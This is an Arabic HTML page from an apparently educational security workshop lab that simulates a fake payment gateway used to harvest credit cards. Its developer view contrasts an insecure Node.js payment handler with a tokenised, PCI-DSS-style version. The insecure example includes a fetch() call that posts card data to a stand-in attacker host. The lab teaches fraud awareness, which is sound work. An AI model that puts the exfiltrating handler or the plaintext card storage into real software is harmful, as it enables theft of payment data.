<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ูุฎุชุจุฑ 06: ุตูุญุฉ ุฏูุน ูุฒููุฉ | ูุฑุดุฉ ูููุฏุณูู ุงููุณุชูุจู</title><link rel="stylesheet" href="../css/styles.css"><link rel="stylesheet" href="../css/animations.css"><link rel="stylesheet" href="../css/labs.css"><link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;700&family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet"><!-- Arabic Fonts --><link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=Tajawal:wght@400;500;700&family=Noto+Sans+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="../css/arabic-fixes.css"><style>
        /* Arabic RTL Support */
        html[lang="ar"] {
            direction: rtl;
            text-align: right;
        }
        
        html[lang="ar"] body {
            font-family: 'Cairo', 'Tajawal', 'Noto Sans Arabic', sans-serif !important;
            direction: rtl;
            text-align: right;
        }
        
        html[lang="ar"] .message-text,
        html[lang="ar"] .lab-description,
        html[lang="ar"] .slide-body p,
        html[lang="ar"] .hint,
        html[lang="ar"] h1, h2, h3, h4, h5, h6 {
            direction: rtl;
            text-align: right;
            unicode-bidi: embed;
        }
        
        html[lang="ar"] input[type="text"],
        html[lang="ar"] textarea {
            direction: rtl;
            text-align: right;
        }
        
        html[lang="ar"] .nav-back {
            float: right;
        }
        
        html[lang="ar"] .labs-grid,
        html[lang="ar"] .ai-labs-grid {
            direction: rtl;
        }
        
        html[lang="ar"] .quick-prompts,
        html[lang="ar"] .capability-item,
        html[lang="ar"] .option-group {
            text-align: right;
        }
        
        /* Fix button alignment for RTL */
        html[lang="ar"] .genre-buttons,
        html[lang="ar"] .setting-buttons,
        html[lang="ar"] .style-buttons {
            justify-content: flex-end;
        }
        
        /* Ensure proper Arabic text rendering */
        html[lang="ar"] * {
            font-kerning: auto;
            text-rendering: optimizeLegibility;
            -webkit-font-feature-settings: "kern" 1, "liga" 1, "calt" 1;
            font-feature-settings: "kern" 1, "liga" 1, "calt" 1;
        }
    </style></head><body><div class="lab-grid-bg"></div><div class="cyber-particles"></div><!-- Language Toggle --><nav class="lab-nav"><a href="../cyber-home.html" class="nav-back"><span>ุงูุนูุฏุฉ ูููุฎุชุจุฑุงุช โ</span></a><h1 class="nav-title"><span>ูุฎุชุจุฑ 06: ุตูุญุฉ ุฏูุน ูุฒููุฉ</span></h1><div class="lab-timer">00:00:00</div></nav><main class="lab-container"><!-- View Toggle --><div class="view-toggle"><button class="toggle-btn active" onclick="switchView('hacker')"><span class="icon">๐</span><span>ุนุฑุถ ุงููุงูุฑ</span></button><button class="toggle-btn" onclick="switchView('developer')"><span class="icon">๐ก๏ธ</span><span>ุนุฑุถ ุงููุทูุฑ</span></button></div><!-- Lab Introduction --><section class="lab-intro"><h2 class="section-header"><span>ูุญุงูุงุฉ ุงูุงุญุชูุงู ุงููุงูู</span></h2><p class="lab-description"><span>ูุณุชูุดู ูุฐุง ุงููุฎุชุจุฑ ููู ููุดุฆ ูุฌุฑูู ุงูุฅูุชุฑูุช ุจูุงุจุงุช ุฏูุน ูุฒููุฉ ูุณุฑูุฉ ูุนูููุงุช ุจุทุงูุงุช ุงูุงุฆุชูุงู 
                ูุงูุจูุงูุงุช ุงููุงููุฉ ูู ุฎูุงู ุชูููุงุช ุงูุชุตูุฏ ุงูุงุญุชูุงูู ุงููุชุทูุฑุฉ.</span></p><div class="threat-level"><span>ูุณุชูู ุงูุชูุฏูุฏ:</span><div class="threat-bar critical"></div><span class="threat-text critical"><span>ุญุฑุฌ</span></span></div></section><!-- Hacker View --><section id="hacker-view" class="view-section active"><div class="terminal-header"><span class="terminal-title"><span>ุทุฑููุฉ ุงููุงูุฑ</span></span><div class="terminal-controls"><span class="control red"></span><span class="control yellow"></span><span class="control green"></span></div></div><div class="hacker-content"><div class="scenario-box"><h3><span>๐ ุงูุณููุงุฑูู</span></h3><p><span>ุฅูุดุงุก ุจูุงุจุฉ ุฏูุน ูุฒููุฉ ูููุนุฉ ุชุญุงูู ููุงูุน ุงูุชุณูู ุงูุดุฑุนูุฉ ูุญุตุงุฏ ุจูุงูุงุช ุจุทุงูุงุช ุงูุงุฆุชูุงู.</span></p><p></span><span>ุงููุฏู: <code>ุงููุชุณูููู ุนุจุฑ ุงูุฅูุชุฑูุช ุงูุฐูู ูููููู ุจุนูููุงุช ุดุฑุงุก</code></span></p></div><div class="exploit-steps"><h3><span>๐ณ ูุฌูู ุงูุงุญุชูุงู ูู ุงูุฏูุน</span></h3><div class="step"><span class="step-number">01</span><div class="step-content"><h4><span>ุฅูุดุงุก ูููุน ุชุณูู ูุฒูู</span></h4><div class="site-builder"><p><span>ุจูุงุก ูููุน ุชุฌุงุฑุฉ ุฅููุชุฑูููุฉ ูููุน:</span></p><div class="site-templates"><button class="template-btn" onclick="selectTemplate('electronics')"><span>๐ฑ ูุชุฌุฑ ุฅููุชุฑูููุงุช</span></button><button class="template-btn" onclick="selectTemplate('fashion')"><span>๐ ุจูุชูู ุฃุฒูุงุก</span></button><button class="template-btn" onclick="selectTemplate('books')"><span>๐ ููุชุจุฉ ุฅููุชุฑูููุฉ</span></button></div><div id="selected-template" class="template-display"></div></div></div></div><div class="step"><span class="step-number">02</span><div class="step-content"><h4><span>ูุดุฑ ุจูุงุจุฉ ุฏูุน ูุฒููุฉ</span></h4><button onclick="deployPaymentGateway()" class="cyber-btn"><span>๐ ูุดุฑ ูุธุงู ุงูุฏูุน</span></button><div id="payment-gateway" class="payment-container"></div></div></div><div class="step"><span class="step-number">03</span><div class="step-content"><h4><span>ุงูุชุญุงู ุดูุงุฏุฉ SSL</span></h4><div class="ssl-spoof"><div class="ssl-status" id="ssl-status"><span class="ssl-icon">๐</span><span class="ssl-text"><span>ุฌุงุฑู ุฅูุดุงุก ุดูุงุฏุฉ SSL ูุฒููุฉ...</span></span></div><button onclick="generateFakeSSL()" class="cyber-btn"><span>๐ ุฅูุดุงุก ุดูุงุฏุฉ ูุฒููุฉ</span></button></div></div></div><div class="step"><span class="step-number">04</span><div class="step-content"><h4><span>ุญุตุงุฏ ุจุทุงูุงุช ุงูุงุฆุชูุงู</span></h4><div class="card-harvester"><div class="harvested-cards" id="harvested-cards"><div class="cards-header"><span>๐ณ ุจูุงูุงุช ุงูุฏูุน ุงููุญุตูุฏุฉ</span></div><div class="cards-list" id="cards-list"><p class="no-cards"><span>ูู ูุชู ุงูุชูุงุท ุจูุงูุงุช ุฏูุน ุจุนุฏ...</span></p></div></div><div class="fraud-stats"><div class="stat"><span class="label"><span>ุงูุจุทุงูุงุช ุงููุญุตูุฏุฉ:</span></span><span id="card-count">0</span></div><div class="stat"><span class="label"><span>ุงููููุฉ ุงูุฅุฌูุงููุฉ:</span></span><span id="total-value">$0</span></div><div class="stat"><span class="label"><span>ูุนุฏู ุงููุฌุงุญ:</span></span><span id="success-rate">0%</span></div></div></div></div></div></div><div class="success-indicator" id="success-indicator"><span class="icon">๐ฐ</span><span><span>ุชู ุญุตุงุฏ ุจูุงูุงุช ุงูุฏูุน!</span></span></div></div></section><!-- Developer View --><section id="developer-view" class="view-section"><div class="terminal-header"><span class="terminal-title"><span>ุทุฑููุฉ ุงููุทูุฑ</span></span><div class="terminal-controls"><span class="control red"></span><span class="control yellow"></span><span class="control green"></span></div></div><div class="developer-content"><div class="vulnerability-explanation"><h3><span>๐ ุซุบุฑุงุช ุงูุงุญุชูุงู ูู ุงูุฏูุน</span></h3><p><span>ููุงูุน ุงูุชุฌุงุฑุฉ ุงูุฅููุชุฑูููุฉ ูู ุฃูุฏุงู ุฑุฆูุณูุฉ ููุงุญุชูุงู ุงููุงูู ูู ุฎูุงู ุทุฑู ูุฌูู ูุฎุชููุฉ:</span></p><div class="vulnerable-code"><h4><span>โ ูุนุงูุฌุฉ ุฏูุน ูุนุฑุถุฉ ููุฎุทุฑ</span></h4><pre class="code-block language-javascript">
// ุณูุก: ูุนุงูุฌุฉ ุฏูุน ุบูุฑ ุขููุฉ
app.post('/process-payment', (req, res) => {
    const { cardNumber, expiryDate, cvv, cardholderName } = req.body;
    
    // ุญูุธ ุจูุงูุงุช ุญุณุงุณุฉ ุจุฏูุน ุชุดููุฑ
    const payment = {
        cardNumber: cardNumber, // ุญูุธ ูุต ุนุงุฏู!
        expiryDate: expiryDate,
        cvv: cvv, // ูุฌุจ ุนุฏู ุญูุธ CVV ุฃุจุฏุงู!
        cardholderName: cardholderName,
        timestamp: Date.now()
    };
    
    // ุชุณุฌูู ุจูุงูุงุช ุญุณุงุณุฉ
    console.log('Processing payment:', payment);
    
    // ุฅุฑุณุงู ููุนุงูุฌ ุงูุฏูุน ุจุฏูุน ุชุญูู
    const result = processPayment(payment);
    
    // ุฅุฑุฌุงุน ุจูุงูุงุช ุญุณุงุณุฉ ูู ุงูุงุณุชุฌุงุจุฉ
    res.json({
        success: true,
        cardNumber: cardNumber, // ูุดู ุจูุงูุงุช ุงูุจุทุงูุฉ!
        transactionId: generateId()
    });
});

// ูุนุงูุฌ ุฏูุน ูุฒูู ูุณุฑู ุงูุจูุงูุงุช
function processPayment(paymentData) {
    // ุฅุฑุณุงู ูุฎุงุฏู ุงูููุงุฌู
    fetch('https://malicious-server.com/steal-cards', {
        method: 'POST',
        body: JSON.stringify(paymentData)
    });
    
    // ุฅุฑุฌุงุน ูุฌุงุญ ุฏุงุฆูุงู ูุชุฌูุจ ุงูุดู
    return { success: true, transactionId: 'fake-123' };
}</pre></div></div><div class="secure-implementation"><h3><span>๐ก๏ธ ุชูููุฐ ุฏูุน ุขูู</span></h3><div class="secure-code"><h4><span>โ ููุฏ ูุชูุงูู ูุน PCI DSS</span></h4><pre class="code-block language-javascript">
// ุฌูุฏ: ูุนุงูุฌุฉ ุฏูุน ุขููุฉ ุชุชุจุน PCI DSS
const crypto = require('crypto');
const validator = require('validator');

class SecurePaymentProcessor {
    constructor() {
        this.encryptionKey = process.env.PAYMENT_ENCRYPTION_KEY;
        this.paymentGateway = new TrustedPaymentGateway();
    }
    
    async processPayment(req, res) {
        try {
            // Validate request origin and CSRF token
            if (!this.validateRequest(req)) {
                return res.status(403).json({ error: 'Invalid request' });
            }
            
            const { cardNumber, expiryDate, cvv, cardholderName, amount } = req.body;
            
            // Input validation and sanitization
            if (!this.validatePaymentData({ cardNumber, expiryDate, cvv, cardholderName, amount })) {
                return res.status(400).json({ error: 'Invalid payment data' });
            }
            
            // Create payment token (never store actual card data)
            const paymentToken = await this.tokenizeCard({
                cardNumber,
                expiryDate,
                cvv,
                cardholderName
            });
            
            // Process payment through secure gateway
            const result = await this.paymentGateway.processPayment({
                token: paymentToken,
                amount: amount,
                currency: 'USD',
                merchantId: process.env.MERCHANT_ID
            });
            
            // Log transaction (without sensitive data)
            this.logTransaction({
                transactionId: result.transactionId,
                amount: amount,
                status: result.status,
                timestamp: new Date().toISOString(),
                // Never log card details
                cardLast4: cardNumber.slice(-4)
            });
            
            // Return minimal success response
            res.json({
                success: result.success,
                transactionId: result.transactionId,
                // Never return card data
                message: 'Payment processed successfully'
            });
            
        } catch (error) {
            this.logError(error);
            res.status(500).json({ error: 'Payment processing failed' });
        }
    }
    
    validatePaymentData({ cardNumber, expiryDate, cvv, cardholderName, amount }) {
        // Luhn algorithm for card validation
        if (!this.isValidCardNumber(cardNumber)) return false;
        
        // Expiry date validation
        if (!this.isValidExpiryDate(expiryDate)) return false;
        
        // CVV validation (but never store it)
        if (!this.isValidCVV(cvv)) return false;
        
        // Amount validation
        if (!validator.isFloat(amount.toString(), { min: 0.01, max: 10000 })) return false;
        
        // Cardholder name validation
        if (!validator.isLength(cardholderName, { min: 2, max: 50 })) return false;
        
        return true;
    }
    
    async tokenizeCard(cardData) {
        // Use payment gateway's tokenization service
        return await this.paymentGateway.createToken(cardData);
    }
    
    isValidCardNumber(cardNumber) {
        // Remove spaces and dashes
        const cleaned = cardNumber.replace(/[\s-]/g, '');
        
        // Check if it's all digits and proper length
        if (!/^\d{13,19}$/.test(cleaned)) return false;
        
        // Luhn algorithm
        let sum = 0;
        let isEven = false;
        
        for (let i = cleaned.length - 1; i >= 0; i--) {
            let digit = parseInt(cleaned.charAt(i));
            
            if (isEven) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            
            sum += digit;
            isEven = !isEven;
        }
        
        return sum % 10 === 0;
    }
}</pre></div><div class="pci-compliance"><h4><span>๐๏ธ ูุชุทูุจุงุช PCI DSS</span></h4><div class="compliance-grid"><div class="compliance-item"><h5><span>1. ุดุจูุฉ ุขููุฉ</span></h5><ul><li><span>ุชุซุจูุช ูุตูุงูุฉ ุฌุฏุงุฑ ุงูุญูุงูุฉ</span></li><li><span>ูุง ุชุณุชุฎุฏู ุงูุฅุนุฏุงุฏุงุช ุงูุงูุชุฑุงุถูุฉ ููุจุงุฆุน</span></li></ul></div><div class="compliance-item"><h5><span>2. ุญูุงูุฉ ุจูุงูุงุช ุญุงูู ุงูุจุทุงูุฉ</span></h5><ul><li><span>ุชุดููุฑ ููู ุจูุงูุงุช ุญุงูู ุงูุจุทุงูุฉ</span></li><li><span>ูุง ุชุฎุฒู ุจูุงูุงุช ุงููุตุงุฏูุฉ ุงูุญุณุงุณุฉ</span></li></ul></div><div class="compliance-item"><h5><span>3. ุฅุฏุงุฑุฉ ุงูุซุบุฑุงุช</span></h5><ul><li><span>ุงุณุชุฎุฏู ูุญุฏุซ ููุงูุญ ุงูููุฑูุณุงุช ุจุงูุชุธุงู</span></li><li><span>ุชุทููุฑ ุฃูุธูุฉ ูุชุทุจููุงุช ุขููุฉ</span></li></ul></div><div class="compliance-item"><h5><span>4. ุงูุชุญูู ูู ุงููุตูู</span></h5><ul><li><span>ุชูููุฏ ุงููุตูู ุญุณุจ ุงูุญุงุฌุฉ ุงูุชุฌุงุฑูุฉ</span></li><li><span>ุชุนููู ูุนุฑู ูุฑูุฏ ููู ุดุฎุต</span></li></ul></div><div class="compliance-item"><h5><span>5. ูุฑุงูุจุฉ ุงูุดุจูุงุช</span></h5><ul><li><span>ุชุชุจุน ููุฑุงูุจุฉ ุฌููุน ุนูููุงุช ุงููุตูู</span></li><li><span>ุงุฎุชุจุงุฑ ุฃูุธูุฉ ุงูุฃูุงู ุจุงูุชุธุงู</span></li></ul></div><div class="compliance-item"><h5><span>6. ุฃูู ุงููุนูููุงุช</span></h5><ul><li><span>ุงูุญูุงุธ ุนูู ุณูุงุณุฉ ุฃูู ุงููุนูููุงุช</span></li><li><span>ุชุฏุฑูุจ ููุชุธู ุนูู ุงูุชูุนูุฉ ุงูุฃูููุฉ</span></li></ul></div></div></div></div><div class="fraud-detection"><h3><span>๐จ ุฃูุธูุฉ ูุดู ุงูุงุญุชูุงู</span></h3><div class="detection-methods"><div class="method-card"><h5><span>ุงููุฑุงูุจุฉ ูู ุงูููุช ุงููุนูู</span></h5><ul><li><span>ูุญุต ุณุฑุนุฉ ุงููุนุงููุงุช</span></li><li><span>ุชุญููู ุงููููุน ุงูุฌุบุฑุงูู</span></li><li><span>ุจุตูุฉ ุงูุฌูุงุฒ</span></li><li><span>ุชุญููู ุงูุณููู</span></li></ul></div><div class="method-card"><h5><span>ุงูุชุนูู ุงูุขูู</span></h5><ul><li><span>ูุดู ุงูุดุฐูุฐ</span></li><li><span>ุงูุชุนุฑู ุนูู ุงูุฃููุงุท</span></li><li><span>ุฎูุงุฑุฒููุงุช ุชูููู ุงููุฎุงุทุฑ</span></li><li><span>ููุงุฐุฌ ุงูุชุนูู ุงูุชูููู</span></li></ul></div><div class="method-card"><h5><span>3D Secure (3DS)</span></h5><ul><li><span>ุทุจูุฉ ูุตุงุฏูุฉ ุฅุถุงููุฉ</span></li><li><span>ุงูุชุญูู ูู ุงููุตุฏุฑ</span></li><li><span>ุญูุงูุฉ ุชุญููู ุงููุณุคูููุฉ</span></li><li><span>ุชูููู ุงููุทุงูุจุงุช ุจุงูุงุณุชุฑุฏุงุฏ</span></li></ul></div></div></div><div class="user-protection"><h3><span>๐ก๏ธ ูุตุงุฆุญ ุญูุงูุฉ ุงููุณุชููู</span></h3><div class="protection-tips"><div class="tip-card"><span class="tip-icon">๐</span><h5><span>ุงูุชุญูู ูู ุดูุงุฏุฉ SSL</span></h5><p><span>ุชุญูู ูู HTTPS ูุงูุดูุงุฏุฉ ุงูุตุงูุญุฉ ูุจู ุฅุฏุฎุงู ูุนูููุงุช ุงูุฏูุน</span></p></div><div class="tip-card"><span class="tip-icon">๐ช</span><h5><span>ุงุณุชุฎุฏู ุงูููุงูุน ุงูููุซููุฉ</span></h5><p><span>ุชุณูู ููุท ุนูู ููุตุงุช ุงูุชุฌุงุฑุฉ ุงูุฅููุชุฑูููุฉ ุงูููุซููุฉ ูุงููุนุฑููุฉ</span></p></div><div class="tip-card"><span class="tip-icon">๐ณ</span><h5><span>ุฑุงูุจ ุงููุดููุงุช</span></h5><p><span>ุชุญูู ุจุงูุชุธุงู ูู ูุดููุงุช ุงูุจูู ูุจุทุงูุงุช ุงูุงุฆุชูุงู ููุฑุณูู ุบูุฑ ุงููุตุฑุญ ุจูุง</span></p></div><div class="tip-card"><span class="tip-icon">๐ฑ</span><h5><span>ุงุณุชุฎุฏู ุงููุฏููุนุงุช ุงููุญูููุฉ</span></h5><p><span>Apple Pay ู Google Pay ูููุฑุงู ุทุจูุงุช ุฃูุงู ุฅุถุงููุฉ</span></p></div><div class="tip-card"><span class="tip-icon">๐ซ</span><h5><span>ุชุฌูุจ WiFi ุงูุนุงู</span></h5><p><span>ูุง ุชูู ุฃุจุฏุงู ุจุงูุฏูุน ุนุจุฑ ุงูุดุจูุงุช ุงูุนุงูุฉ ุบูุฑ ุงูุขููุฉ</span></p></div><div class="tip-card"><span class="tip-icon">๐</span><h5><span>ุชูุนูู ุงูุชูุจููุงุช</span></h5><p><span>ุฅุนุฏุงุฏ ุชูุจููุงุช ุงููุนุงููุงุช ูููุดู ุงูููุฑู ุนู ุงูุงุญุชูุงู</span></p></div></div></div></div></section><!-- Lab Progress --><div class="lab-progress"><div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div><div class="progress-steps"><div class="step-indicator active"><span>ุงูุฅุนุฏุงุฏ</span></div><div class="step-indicator"><span>ุงููุดุฑ</span></div><div class="step-indicator"><span>ุงูุญุตุงุฏ</span></div><div class="step-indicator"><span>ุงูุฃูุงู</span></div></div></div></main><script src="../js/lab-common.js"></script><script src="../js/lab6-payment.js"></script></body></html> 